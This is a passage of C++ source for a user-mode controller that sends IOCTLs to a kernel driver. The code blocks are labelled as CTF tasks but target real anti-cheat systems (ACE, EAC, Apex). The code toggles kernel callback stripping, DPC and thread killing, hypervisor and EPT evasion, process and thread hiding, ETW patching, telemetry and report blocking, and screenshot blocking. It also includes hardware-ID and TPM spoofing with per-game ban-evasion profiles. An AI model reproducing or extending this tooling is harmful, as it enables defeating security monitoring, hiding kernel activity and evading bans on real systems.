                    EacSubsysStatus2 MemEvasion;
                    DWORD CallbacksStripped;
                    DWORD DpcsKilled;
                    DWORD TimersKilled;
                    DWORD ThreadsKilled;
                    DWORD WorkItemsKilled;
                    DWORD ModulesScanned;
                    DWORD HvDetected;
                    DWORD MutationPasses;
                } aceResp = {0};

                Log("[*] ACE req size=%u resp size=%u\n", (unsigned)sizeof(aceReq), (unsigned)sizeof(aceResp));

                BOOL aceOk = DeviceIoControl(hBetest, _IOCTL_ACE_STRENGTHEN,
                            &aceReq, sizeof(aceReq), &aceResp, sizeof(aceResp), &ret, nullptr);

                if (!aceOk) {
                    Log("[!] ACE strengthen: DeviceIoControl failed (err=%u)\n",
                        (unsigned)GetLastError());
                } else {
                    Log("[+] ACE strengthen: active=0x%x\n", aceResp.ActiveFeatures);

                    struct { const char* name; DWORD flag; EacSubsysStatus2* ss; bool needsPid; } aceSubs[] = {
                        { "Callbacks",   _ACE_STR_CALLBACKS,   &aceResp.Callbacks,  false },
                        { "DPC Kill",    _ACE_STR_DPC_KILL,    &aceResp.DpcKill,    false },
                        { "HV Evasion",  _ACE_STR_HV_EVASION,  &aceResp.HvEvasion,  false },
                        { "Early Load",  _ACE_STR_EARLY_LOAD,   &aceResp.EarlyLoad,  false },
                        { "CR3+DKOM",    _ACE_STR_CR3_DKOM,    &aceResp.Cr3Dkom,    true  },
                        { "Mem Evasion", _ACE_STR_MEM_EVASION,  &aceResp.MemEvasion, false },
                    };

                    for (auto& s : aceSubs) {
                        if (!(g_aceStrFlags & s.flag)) continue;
                        if (!s.ss->Enabled) {
                            Log("[-]   %s: not enabled\n", s.name);
                        } else if (s.ss->LastResult == 0) {
                            if (s.ss->ItemsProcessed > 0) {
                                Log("[+]   %s: OK (items=%u, runs=%u, success=%u)\n",
                                    s.name, s.ss->ItemsProcessed, s.ss->RunCount, s.ss->SuccessCount);
                            } else if (s.needsPid && !aceReq.TargetPid) {
                                Log("[~]   %s: SKIPPED (needs target PID)\n", s.name);
                            } else {
                                Log("[~]   %s: OK but 0 items (no AC modules loaded)\n", s.name);
                            }
                        } else {
                            Log("[!]   %s: FAILED (status=0x%08x, items=%u, fails=%u)\n",
                                s.name, (unsigned)s.ss->LastResult, s.ss->ItemsProcessed, s.ss->FailCount);
                        }
                    }

                    Log("[*]   --- ACE Aggregate counters ---\n");
                    Log("[*]   Callbacks stripped: %u\n", aceResp.CallbacksStripped);
                    Log("[*]   DPCs killed: %u\n", aceResp.DpcsKilled);
                    Log("[*]   Timers killed: %u\n", aceResp.TimersKilled);
                    Log("[*]   Threads killed: %u\n", aceResp.ThreadsKilled);
                    Log("[*]   WorkItems killed: %u\n", aceResp.WorkItemsKilled);
                    Log("[*]   Modules scanned: %u\n", aceResp.ModulesScanned);
                    Log("[*]   HV detected: %u\n", aceResp.HvDetected);
                    Log("[*]   Mutation passes: %u\n", aceResp.MutationPasses);
                }
            } else {
                Log("[+] Skipped: ACE strengthen (use --ace 3f to test)\n");
            }

            // CTF Task 43: Advanced ACE evasion
            #define _IOCTL_ADV_ACE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x847, METHOD_BUFFERED, FILE_ANY_ACCESS)

            #define _ADV_ACE_HV_EPT     0x01
            #define _ADV_ACE_MEM_SCAN   0x02
            #define _ADV_ACE_PROC_HIDE  0x04
            #define _ADV_ACE_EARLY_INIT 0x08

            if (g_advAceFlags) {
                Log("[*] Adv ACE evasion: applying features 0x%x (ioctl=0x%x)\n", g_advAceFlags, _IOCTL_ADV_ACE);

                struct { DWORD Features; DWORD Flags; UINT64 TargetPid; UINT64 GamePid; } advReq = {0};
                advReq.Features = g_advAceFlags;
                advReq.TargetPid = 0;
                advReq.GamePid = 0;

                struct AdvSubStatus { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; LONG LastResult; };
                struct {
                    DWORD ActiveFeatures; DWORD Pad;
                    AdvSubStatus HvEpt;
                    AdvSubStatus MemScan;
                    AdvSubStatus ProcHide;
                    AdvSubStatus EarlyInit;
                    DWORD HvDetected;
                    DWORD EptBypassed;
                    DWORD MsrMasked;
                    DWORD CpuidCached;
                    DWORD SectionsEncrypted;
                    DWORD GadgetsDestroyed;
                    DWORD HeadersZeroed;
                    DWORD PoolRetagged;
                    DWORD ThreadsHidden;
                    DWORD HandlesRemoved;
                    DWORD LinksUnlinked;
                    DWORD JobsCleaned;
                    DWORD NotifyCallbacksGuarded;
                    DWORD ModulesPatched;
                    DWORD EtwRepatched;
                    DWORD EntryPointsNeutered;
                } advResp = {0};

                Log("[*] Adv req size=%u resp size=%u\n", (unsigned)sizeof(advReq), (unsigned)sizeof(advResp));

                BOOL ok = DeviceIoControl(hBetest, _IOCTL_ADV_ACE,
                            &advReq, sizeof(advReq), &advResp, sizeof(advResp), &ret, nullptr);

                if (!ok) {
                    Log("[!] Adv ACE: DeviceIoControl failed (err=%u)\n",
                        (unsigned)GetLastError());
                } else {
                    Log("[+] Adv ACE: active=0x%x\n", advResp.ActiveFeatures);

                    struct { const char* name; DWORD flag; AdvSubStatus* ss; bool needsPid; } subs[] = {
                        { "HV/EPT Evasion",  _ADV_ACE_HV_EPT,     &advResp.HvEpt,     false },
                        { "Memory Scan",     _ADV_ACE_MEM_SCAN,    &advResp.MemScan,   false },
                        { "Process Hide",    _ADV_ACE_PROC_HIDE,   &advResp.ProcHide,  true  },
                        { "Early Init",      _ADV_ACE_EARLY_INIT,  &advResp.EarlyInit, false },
                    };

                    for (auto& s : subs) {
                        if (!(g_advAceFlags & s.flag)) continue;
                        if (!s.ss->Enabled) {
                            Log("[-]   %s: not enabled\n", s.name);
                        } else if (s.ss->LastResult == 0) {
                            if (s.ss->ItemsProcessed > 0) {
                                Log("[+]   %s: OK (items=%u, runs=%u, success=%u)\n",
                                    s.name, s.ss->ItemsProcessed, s.ss->RunCount, s.ss->SuccessCount);
                            } else if (s.needsPid && !advReq.TargetPid) {
                                Log("[~]   %s: SKIPPED (needs target PID)\n", s.name);
                            } else {
                                Log("[~]   %s: OK but 0 items\n", s.name);
                            }
                        } else {
                            Log("[!]   %s: FAILED (status=0x%08x, items=%u, fails=%u)\n",
                                s.name, (unsigned)s.ss->LastResult, s.ss->ItemsProcessed, s.ss->FailCount);
                        }
                    }

                    Log("[*]   --- Adv ACE Detail ---\n");
                    Log("[*]   HV detected: %u, EPT bypassed: %u, MSR masked: %u, CPUID cached: %u\n",
                        advResp.HvDetected, advResp.EptBypassed, advResp.MsrMasked, advResp.CpuidCached);
                    Log("[*]   Sections encrypted: %u, Gadgets destroyed: %u, Headers zeroed: %u, Pool retagged: %u\n",
                        advResp.SectionsEncrypted, advResp.GadgetsDestroyed, advResp.HeadersZeroed, advResp.PoolRetagged);
                    Log("[*]   Threads hidden: %u, Handles removed: %u, Links unlinked: %u\n",
                        advResp.ThreadsHidden, advResp.HandlesRemoved, advResp.LinksUnlinked);
                    Log("[*]   Notify guarded: %u, Modules patched: %u, ETW repatched: %u, Entry neutered: %u\n",
                        advResp.NotifyCallbacksGuarded, advResp.ModulesPatched, advResp.EtwRepatched, advResp.EntryPointsNeutered);
                }
            } else {
                Log("[+] Skipped: Adv ACE evasion (use --adv f to test)\n");
            }

            // CTF Task 44: Final ACE hardening
            #define _IOCTL_FINAL_ACE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x848, METHOD_BUFFERED, FILE_ANY_ACCESS)

            #define _FINAL_ACE_TIMING    0x01
            #define _FINAL_ACE_ENCRYPT   0x02
            #define _FINAL_ACE_STACK     0x04
            #define _FINAL_ACE_CALLBACK  0x08
            #define _FINAL_ACE_HVDETECT  0x10
            #define _FINAL_ACE_SELFTEST  0x20

            if (g_finalAceFlags) {
                Log("[*] Final ACE harden: applying features 0x%x (ioctl=0x%x)\n", g_finalAceFlags, _IOCTL_FINAL_ACE);

                struct { DWORD Features; DWORD Flags; UINT64 TargetPid; UINT64 Reserved; } finalReq = {0};
                finalReq.Features = g_finalAceFlags;

                struct FinalSubStatus { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; LONG LastResult; };
                struct {
                    DWORD ActiveFeatures; DWORD TotalItems;
                    FinalSubStatus Timing;
                    FinalSubStatus Encrypt;
                    FinalSubStatus Stack;
                    FinalSubStatus Callback;
                    FinalSubStatus HvDetect;
                    FinalSubStatus SelfTest;
                    UINT64 RdtscBaseline;
                    UINT64 RdtscNormalized;
                    DWORD TimingAnomalies;
                    DWORD TimingCalibrations;
                    DWORD PagesEncrypted;
                    DWORD HeadersZeroed;
                    DWORD SectionsScrambled;
                    DWORD EncryptKeyRotations;
                    DWORD StackFramesCleaned;
                    DWORD ThreadsScanned;
                    DWORD NotifyRoutinesFound;
                    DWORD NotifyRoutinesRemoved;
                    DWORD ImageLoadCbRemoved;
                    DWORD Pad1;
                    DWORD HvCpuidVendor;
                    DWORD HvCpuidBit;
                    DWORD HvTimingDelta;
                    DWORD HvIdtBase;
                    DWORD HvGdtLimit;
                    DWORD HvMsrFault;
                    DWORD HvVectors;
                    DWORD HvPositives;
                    DWORD TestsPassed;
                    DWORD TestsFailed;
                    DWORD TestsSkipped;
                    DWORD Pad2;
                } finalResp = {0};

                Log("[*] Final req size=%u resp size=%u\n", (unsigned)sizeof(finalReq), (unsigned)sizeof(finalResp));

                BOOL ok = DeviceIoControl(hBetest, _IOCTL_FINAL_ACE,
                            &finalReq, sizeof(finalReq), &finalResp, sizeof(finalResp), &ret, nullptr);

                if (!ok) {
                    Log("[!] Final ACE: DeviceIoControl failed (err=%u)\n", (unsigned)GetLastError());
                } else {
                    Log("[+] Final ACE: active=0x%x total_items=%u\n", finalResp.ActiveFeatures, finalResp.TotalItems);

                    struct { const char* name; DWORD flag; FinalSubStatus* ss; } subs[] = {
                        { "RDTSC Timing",    _FINAL_ACE_TIMING,    &finalResp.Timing },
                        { "Section Encrypt", _FINAL_ACE_ENCRYPT,   &finalResp.Encrypt },
                        { "Stack Sanitize",  _FINAL_ACE_STACK,     &finalResp.Stack },
                        { "Callback Clean",  _FINAL_ACE_CALLBACK,  &finalResp.Callback },
                        { "HV Detection",    _FINAL_ACE_HVDETECT,  &finalResp.HvDetect },
                        { "Self-Test",       _FINAL_ACE_SELFTEST,  &finalResp.SelfTest },
                    };

                    for (auto& s : subs) {
                        if (!(g_finalAceFlags & s.flag)) continue;
                        if (!s.ss->Enabled) {
                            Log("[-]   %s: not enabled\n", s.name);
                        } else if (s.ss->LastResult == 0) {
                            Log("[+]   %s: OK (items=%u, runs=%u)\n",
                                s.name, s.ss->ItemsProcessed, s.ss->RunCount);
                        } else {
                            Log("[!]   %s: FAILED (status=0x%08x, items=%u)\n",
                                s.name, (unsigned)s.ss->LastResult, s.ss->ItemsProcessed);
                        }
                    }

                    Log("[*]   --- Timing Detail ---\n");
                    Log("[*]   RDTSC baseline: %llu, normalized: %llu, anomalies: %u, calibrations: %u\n",
                        finalResp.RdtscBaseline, finalResp.RdtscNormalized,
                        finalResp.TimingAnomalies, finalResp.TimingCalibrations);

                    Log("[*]   --- Encrypt Detail ---\n");
                    Log("[*]   Pages encrypted: %u, Headers zeroed: %u, Sections scrambled: %u, Key rotations: %u\n",
                        finalResp.PagesEncrypted, finalResp.HeadersZeroed,
                        finalResp.SectionsScrambled, finalResp.EncryptKeyRotations);

                    Log("[*]   --- Stack Detail ---\n");
                    Log("[*]   Stack frames cleaned: %u, Threads scanned: %u\n",
                        finalResp.StackFramesCleaned, finalResp.ThreadsScanned);

                    Log("[*]   --- Callback Detail ---\n");
                    Log("[*]   Notify routines found: %u, removed: %u, image-load removed: %u\n",
                        finalResp.NotifyRoutinesFound, finalResp.NotifyRoutinesRemoved,
                        finalResp.ImageLoadCbRemoved);

                    Log("[*]   --- HV Detection Detail ---\n");
                    Log("[*]   Vectors checked: %u, Positives: %u\n",
                        finalResp.HvVectors, finalResp.HvPositives);
                    Log("[*]   CPUID vendor: %u, CPUID bit: %u, Timing: %u, IDT: %u, GDT: %u, MSR: %u\n",
                        finalResp.HvCpuidVendor, finalResp.HvCpuidBit,
                        finalResp.HvTimingDelta, finalResp.HvIdtBase,
                        finalResp.HvGdtLimit, finalResp.HvMsrFault);

                    if (g_finalAceFlags & _FINAL_ACE_SELFTEST) {
                        Log("[*]   --- Self-Test Detail ---\n");
                        Log("[*]   Passed: %u, Failed: %u, Skipped: %u\n",
                            finalResp.TestsPassed, finalResp.TestsFailed, finalResp.TestsSkipped);
                    }
                }
            } else {
                Log("[+] Skipped: Final ACE harden (use --final 3f to test)\n");
            }

            // ── CTF Task 49: Deep AC Resistance ──
            if (g_deepAcFlags) {
                #define _IOCTL_DEEP_AC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x849, METHOD_BUFFERED, FILE_ANY_ACCESS)
                #define _DEEP_AC_EPT        0x01
                #define _DEEP_AC_MEMSCRAMBLE 0x02
                #define _DEEP_AC_THREADCLOAK 0x04
                #define _DEEP_AC_TELEMETRY   0x08
                #define _DEEP_AC_PGSTABLE    0x10

                Log("[*] Deep AC resist: applying features 0x%x (ioctl=0x%x)\n", g_deepAcFlags, _IOCTL_DEEP_AC);

                struct { DWORD Features; DWORD Flags; UINT64 TargetPid; UINT64 Reserved; } deepReq = {0};
                deepReq.Features = g_deepAcFlags;
                deepReq.TargetPid = GetCurrentProcessId();

                struct DeepSubStatus { DWORD Enabled; DWORD ItemsProcessed; DWORD RunCount; DWORD SuccessCount; DWORD LastResult; DWORD Pad; };
                struct DeepRespT {
                    DWORD ActiveFeatures; DWORD TotalItems;
                    DeepSubStatus Ept; DeepSubStatus MemScramble; DeepSubStatus ThreadCloak;
                    DeepSubStatus Telemetry; DeepSubStatus PgStability;
                    DWORD EptViolations; DWORD EptPagesHardened; DWORD EptSplitDetected; DWORD EptPad;
                    DWORD PagesScrambled; DWORD HeadersRandomized; DWORD PoolTagsRotated; DWORD MemPad;
                    DWORD ThreadsCloaked; DWORD ThreadsFound; DWORD ApcQueueBlocked; DWORD ThreadPad;
                    DWORD PortsBlocked; DWORD IrpsCancelled; DWORD RegKeysHidden; DWORD TelPad;
                    DWORD PgTimersSafe; DWORD PgDpcsCleaned; DWORD PgWorkItemsAudited; DWORD PgPad;
                };
                DeepRespT deepResp = {0};
                Log("[*] Deep req size=%u resp size=%u\n", (unsigned)sizeof(deepReq), (unsigned)sizeof(deepResp));
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_DEEP_AC,
                    &deepReq, sizeof(deepReq), &deepResp, sizeof(deepResp), &ret, nullptr);

                if (!ok) {
                    Log("[!] Deep AC: DeviceIoControl failed (err=%u)\n", (unsigned)GetLastError());
                } else {
                    Log("[+] Deep AC: active=0x%x total_items=%u\n", deepResp.ActiveFeatures, deepResp.TotalItems);

                    struct { const char* name; DWORD flag; DeepSubStatus* ss; } subs[] = {
                        { "EPT Resistance",  _DEEP_AC_EPT,        &deepResp.Ept },
                        { "Mem Scramble",    _DEEP_AC_MEMSCRAMBLE, &deepResp.MemScramble },
                        { "Thread Cloak",    _DEEP_AC_THREADCLOAK, &deepResp.ThreadCloak },
                        { "Telemetry Block", _DEEP_AC_TELEMETRY,   &deepResp.Telemetry },
                        { "PG Stability",    _DEEP_AC_PGSTABLE,    &deepResp.PgStability },
                    };
                    for (auto& s : subs) {
                        if (!(g_deepAcFlags & s.flag)) continue;
                        Log("[+]   %s: %s (items=%u, runs=%u)\n",
                            s.name, s.ss->LastResult == 0 ? "OK" : "FAIL",
                            s.ss->ItemsProcessed, s.ss->RunCount);
                    }

                    Log("[*]   --- EPT Detail ---\n");
                    Log("[*]   Violations: %u, Pages hardened: %u, Split detected: %u\n",
                        deepResp.EptViolations, deepResp.EptPagesHardened, deepResp.EptSplitDetected);
                    Log("[*]   --- MemScramble Detail ---\n");
                    Log("[*]   Pages scrambled: %u, Headers randomized: %u, Tags rotated: %u\n",
                        deepResp.PagesScrambled, deepResp.HeadersRandomized, deepResp.PoolTagsRotated);
                    Log("[*]   --- ThreadCloak Detail ---\n");
                    Log("[*]   Threads cloaked: %u, Found: %u, APC blocked: %u\n",
                        deepResp.ThreadsCloaked, deepResp.ThreadsFound, deepResp.ApcQueueBlocked);
                    Log("[*]   --- Telemetry Detail ---\n");
                    Log("[*]   Ports blocked: %u, IRPs cancelled: %u, Registry keys: %u\n",
                        deepResp.PortsBlocked, deepResp.IrpsCancelled, deepResp.RegKeysHidden);
                    Log("[*]   --- PG Stability Detail ---\n");
                    Log("[*]   Timers safe: %u, DPCs cleaned: %u, WorkItems audited: %u\n",
                        deepResp.PgTimersSafe, deepResp.PgDpcsCleaned, deepResp.PgWorkItemsAudited);
                }
            } else {
                Log("[+] Skipped: Deep AC resist (use --deep 1f to test)\n");
            }

            // ── CTF Task 53: HWID Spoofer ──
            #define _IOCTL_HWID_SPOOF   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x84A, METHOD_BUFFERED, FILE_ANY_ACCESS)
            #define _IOCTL_HWID_CLEAN   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x84B, METHOD_BUFFERED, FILE_ANY_ACCESS)
            #define _IOCTL_HWID_RESTORE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x84C, METHOD_BUFFERED, FILE_ANY_ACCESS)
            #define _IOCTL_HWID_STATUS  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x84D, METHOD_BUFFERED, FILE_ANY_ACCESS)

            struct HwidSubSt { DWORD Enabled; DWORD ItemsSpoofed; DWORD RunCount; DWORD LastResult; };
            struct HwidResp {
                DWORD ActiveFeatures; DWORD TotalSpoofed; DWORD CanRestore; DWORD CleanDone;
                HwidSubSt Disk; HwidSubSt Nic; HwidSubSt Smbios;
                HwidSubSt Volume; HwidSubSt Gpu; HwidSubSt Registry;
            };

            // Apply game profile if specified
            if (g_hwidGame) {
                bool found = false;
                for (int g = 0; g < (int)(sizeof(g_gameProfiles)/sizeof(g_gameProfiles[0])); g++) {
                    if (_stricmp(g_hwidGame, g_gameProfiles[g].name) == 0) {
                        Log("[*] HWID game profile: %s (%s)\n", g_gameProfiles[g].display, g_gameProfiles[g].name);
                        if (!g_hwidFlags) g_hwidFlags = g_gameProfiles[g].features;
                        if (g_gameProfiles[g].ghost) g_hwidGhost = true;
                        found = true;
                        break;
                    }
                }
                if (!found) Log("[!] Unknown game profile: %s (use --hwid-list)\n", g_hwidGame);
            }

            if (g_hwidFlags) {
                DWORD hwidMode = g_hwidGhost ? 1 : 0;
                if (g_hwidGhost) {
                    Log("[*] HWID GHOST MODE: nulling/zeroing all serials\n");
                    Log("[*] ╔══════════════════════════════════════════╗\n");
                    Log("[*] ║  GHOST MODE ACTIVE - Serials zeroed     ║\n");
                    Log("[*] ╚══════════════════════════════════════════╝\n");
                } else if (g_hwidSeed != 0) {
                    Log("[*] HWID spoof: using fixed seed 0x%llx (features=0x%x)\n", g_hwidSeed, g_hwidFlags);
                } else {
                    Log("[*] HWID spoof: randomizing serials (features=0x%x)\n", g_hwidFlags);
                }

                // Query before-state
                HwidResp beforeResp = {0};
                DeviceIoControl(hBetest, _IOCTL_HWID_STATUS,
                    nullptr, 0, &beforeResp, sizeof(beforeResp), &ret, nullptr);

                Log("[*] === Before Spoofing ===\n");
                Log("[*]   Active features: 0x%x  Total spoofed: %u\n",
                    beforeResp.ActiveFeatures, beforeResp.TotalSpoofed);

                // Apply spoof (Flags: 0=random, 1=ghost/zero, 2=custom seed)
                DWORD seedMode = hwidMode;
                if (!g_hwidGhost && g_hwidSeed != 0) seedMode = 2;
                struct { DWORD Features; DWORD Flags; UINT64 Seed; } hwidReq = { g_hwidFlags, seedMode, g_hwidSeed };
                HwidResp hwidResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_HWID_SPOOF,
                    &hwidReq, sizeof(hwidReq), &hwidResp, sizeof(hwidResp), &ret, nullptr);
                if (!ok) {
                    Log("[!] HWID spoof: DeviceIoControl failed (err=%u)\n", (unsigned)GetLastError());
                } else {
                    Log("[*] === After Spoofing ===\n");
                    Log("[+] HWID spoof: active=0x%x total=%u canRestore=%u\n",
                        hwidResp.ActiveFeatures, hwidResp.TotalSpoofed, hwidResp.CanRestore);
                    struct { const char* name; DWORD flag; HwidSubSt* ss; } subs[] = {
                        { "Disk Serial",  0x01, &hwidResp.Disk },
                        { "NIC MAC",      0x02, &hwidResp.Nic },
                        { "SMBIOS",       0x04, &hwidResp.Smbios },
                        { "Volume ID",    0x08, &hwidResp.Volume },
                        { "GPU",          0x10, &hwidResp.Gpu },
                        { "Registry",     0x20, &hwidResp.Registry },
                    };
                    for (auto& s : subs) {
                        if (!(g_hwidFlags & s.flag)) continue;
                        Log("[+]   %s: %s (items=%u, runs=%u) %s\n",
                            s.name, s.ss->LastResult == 0 ? "OK" : "FAIL",
                            s.ss->ItemsSpoofed, s.ss->RunCount,
                            g_hwidGhost ? "[GHOSTED]" : "[RANDOMIZED]");
                    }
                    if (g_hwidGhost) {
                        Log("[+] Ghost mode: all targeted serials set to NULL/zero values\n");
                    }
                }
            }

            if (g_hwidClean) {
                Log("[*] HWID clean: removing traces\n");
                HwidResp cleanResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_HWID_CLEAN,
                    nullptr, 0, &cleanResp, sizeof(cleanResp), &ret, nullptr);
                if (ok) Log("[+] HWID clean: done (active=0x%x)\n", cleanResp.ActiveFeatures);
                else Log("[!] HWID clean: failed (err=%u)\n", (unsigned)GetLastError());
            }

            if (g_hwidRestore) {
                Log("[*] HWID restore: reverting to originals\n");
                HwidResp restResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_HWID_RESTORE,
                    nullptr, 0, &restResp, sizeof(restResp), &ret, nullptr);
                if (ok) Log("[+] HWID restore: done (restored=%u)\n", restResp.TotalSpoofed);
                else Log("[!] HWID restore: failed (err=%u)\n", (unsigned)GetLastError());
            }

            if (!g_hwidFlags && !g_hwidClean && !g_hwidRestore) {
                Log("[+] Skipped: HWID spoof (use --hwid 3f to test)\n");
            }

            // ── TPM Spoof (EAC bans flagged TPM) ──
            #define _IOCTL_TPM_SPOOF CTL_CODE(FILE_DEVICE_UNKNOWN, 0x871, METHOD_BUFFERED, FILE_ANY_ACCESS)

            struct TpmSpoofResp {
                DWORD ActiveFeatures;
                DWORD TpmPresent;
                DWORD TpmDisabled;
                DWORD TpmIdSpoofed;
                DWORD TpmPcrCleared;
                DWORD RegistryPatched;
                DWORD WmiHooked;
            };

            if (g_tpmSpoofFlags) {
                Log("[*] TPM spoof: applying features 0x%x\n", g_tpmSpoofFlags);
                struct { DWORD Features; DWORD Flags; } tpmReq = { g_tpmSpoofFlags, 0 };
                TpmSpoofResp tpmResp = {};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_TPM_SPOOF,
                    &tpmReq, sizeof(tpmReq), &tpmResp, sizeof(tpmResp), &ret, nullptr);
                if (!ok) {
                    Log("[!] TPM spoof: DeviceIoControl failed (err=%u)\n", (unsigned)GetLastError());
                } else {
                    Log("[+] TPM spoof: active=0x%x present=%u\n", tpmResp.ActiveFeatures, tpmResp.TpmPresent);
                    if (g_tpmSpoofFlags & 0x01) Log("[+]   Disable: %s\n", tpmResp.TpmDisabled ? "OK" : "N/A");
                    if (g_tpmSpoofFlags & 0x02) Log("[+]   Spoof ID: %s\n", tpmResp.TpmIdSpoofed ? "OK" : "N/A");
                    if (g_tpmSpoofFlags & 0x04) Log("[+]   Clean traces: reg=%u wmi=%u\n", tpmResp.RegistryPatched, tpmResp.WmiHooked);
                }
            }

            // ── CTF Task 54: ACE Delta Force Hardening ──
            #define _IOCTL_ACE_DELTA CTL_CODE(FILE_DEVICE_UNKNOWN, 0x84E, METHOD_BUFFERED, FILE_ANY_ACCESS)

            struct AceDeltaSubSt { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct AceDeltaResp {
                DWORD ActiveFeatures; DWORD TotalItems;
                AceDeltaSubSt EarlyTiming; AceDeltaSubSt CbNeutralize; AceDeltaSubSt ReportKill;
                AceDeltaSubSt HvEptEvade; AceDeltaSubSt MemScanResist;
                DWORD TimersKilled; DWORD DpcsKilled; DWORD CallbacksStripped; DWORD ReportsBlocked;
                DWORD EptPagesProtected; DWORD MemRegionsHardened; DWORD ThreadsAudited; DWORD Pad;
            };

            if (g_deltaFlags) {
                Log("[*] ACE Delta harden: applying features 0x%x\n", g_deltaFlags);
                struct { DWORD Features; DWORD Flags; UINT64 TargetPid; } deltaReq = { g_deltaFlags, 0, 0 };
                AceDeltaResp deltaResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_ACE_DELTA,
                    &deltaReq, sizeof(deltaReq), &deltaResp, sizeof(deltaResp), &ret, nullptr);
                if (!ok) {
                    Log("[!] ACE Delta: DeviceIoControl failed (err=%u)\n", (unsigned)GetLastError());
                } else {
                    Log("[+] ACE Delta: active=0x%x total=%u\n",
                        deltaResp.ActiveFeatures, deltaResp.TotalItems);
                    struct { const char* name; DWORD flag; AceDeltaSubSt* ss; } subs[] = {
                        { "Early Timing",   0x01, &deltaResp.EarlyTiming },
                        { "CB Neutralize",  0x02, &deltaResp.CbNeutralize },
                        { "Report Kill",    0x04, &deltaResp.ReportKill },
                        { "HV/EPT Evade",   0x08, &deltaResp.HvEptEvade },
                        { "MemScan Resist", 0x10, &deltaResp.MemScanResist },
                    };
                    for (auto& s : subs) {
                        if (!(g_deltaFlags & s.flag)) continue;
                        Log("[+]   %s: %s (items=%u, runs=%u)\n",
                            s.name, s.ss->SuccessCount ? "OK" : "FAIL",
                            s.ss->ItemsProcessed, s.ss->RunCount);
                    }
                    Log("[*]   --- Delta Detail ---\n");
                    Log("[*]   Timers=%u, DPCs=%u, Callbacks=%u, Reports=%u\n",
                        deltaResp.TimersKilled, deltaResp.DpcsKilled,
                        deltaResp.CallbacksStripped, deltaResp.ReportsBlocked);
                    Log("[*]   EPT pages=%u, MemRegions=%u, Threads=%u\n",
                        deltaResp.EptPagesProtected, deltaResp.MemRegionsHardened,
                        deltaResp.ThreadsAudited);
                }
            } else {
                Log("[+] Skipped: ACE Delta harden (use --delta 1f to test)\n");
            }

            // ── CTF Task 55: EAC + Screenshot Protection (Apex) ──
            #define _IOCTL_EAC_APEX CTL_CODE(FILE_DEVICE_UNKNOWN, 0x84F, METHOD_BUFFERED, FILE_ANY_ACCESS)

            struct ApexSubSt { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct ApexResp {
                DWORD ActiveFeatures; DWORD TotalItems;
                ApexSubSt CbHook; ApexSubSt ReportBlock; ApexSubSt Screenshot;
                ApexSubSt MemEncrypt; ApexSubSt Timing; ApexSubSt EarlyLoad;
                DWORD CallbacksHooked; DWORD ReportsBlocked; DWORD ScreenshotBlocked;
                DWORD RegionsEncrypted; DWORD TimingChecks; DWORD EarlyHooks; DWORD Pad[2];
            };

            if (g_apexFlags) {
                Log("[*] EAC/Apex harden: applying features 0x%x\n", g_apexFlags);
                struct { DWORD Features; DWORD Flags; UINT64 TargetPid; } apexReq = { g_apexFlags, 0, 0 };
                ApexResp apexResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_EAC_APEX,
                    &apexReq, sizeof(apexReq), &apexResp, sizeof(apexResp), &ret, nullptr);
                if (!ok) {
                    Log("[!] EAC/Apex: DeviceIoControl failed (err=%u)\n", (unsigned)GetLastError());
                } else {
                    Log("[+] EAC/Apex: active=0x%x total=%u\n", apexResp.ActiveFeatures, apexResp.TotalItems);
                    struct { const char* name; DWORD flag; ApexSubSt* ss; } subs[] = {
                        { "CB Hook",      0x01, &apexResp.CbHook },
                        { "Report Block", 0x02, &apexResp.ReportBlock },
                        { "Screenshot",   0x04, &apexResp.Screenshot },
                        { "Mem Encrypt",  0x08, &apexResp.MemEncrypt },
                        { "Timing",       0x10, &apexResp.Timing },
                        { "Early Load",   0x20, &apexResp.EarlyLoad },
                    };
                    for (auto& s : subs) {
                        if (!(g_apexFlags & s.flag)) continue;
                        Log("[+]   %s: %s (items=%u, runs=%u)\n",
                            s.name, s.ss->SuccessCount ? "OK" : "FAIL",
                            s.ss->ItemsProcessed, s.ss->RunCount);
                    }
                }
            } else {
                Log("[+] Skipped: EAC/Apex harden (use --apex 3f to test)\n");
            }

            // ── CTF Task 56: Behavioral & Timing Stealth ──
            #define _IOCTL_BEHAV_STEALTH CTL_CODE(FILE_DEVICE_UNKNOWN, 0x850, METHOD_BUFFERED, FILE_ANY_ACCESS)

            struct BehavSubSt { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct BehavResp {
                DWORD ActiveFeatures; DWORD TotalItems;
                BehavSubSt TimingResist; BehavSubSt PatternBreak;
                BehavSubSt AntiSandbox; BehavSubSt TelemetryCut;
                DWORD TimingChecksEvaded; DWORD PatternsRandomized;
                DWORD SandboxChecks; DWORD TelemetryBlocked;
            };

            if (g_behavFlags) {
                Log("[*] Behavioral stealth: applying features 0x%x\n", g_behavFlags);
                struct { DWORD Features; DWORD Flags; UINT64 Pad; } behavReq = { g_behavFlags, 0, 0 };
                BehavResp behavResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_BEHAV_STEALTH,
                    &behavReq, sizeof(behavReq), &behavResp, sizeof(behavResp), &ret, nullptr);
                if (!ok) {
                    Log("[!] Behavioral stealth: failed (err=%u)\n", (unsigned)GetLastError());
                } else {
                    Log("[+] Behavioral stealth: active=0x%x total=%u\n", behavResp.ActiveFeatures, behavResp.TotalItems);
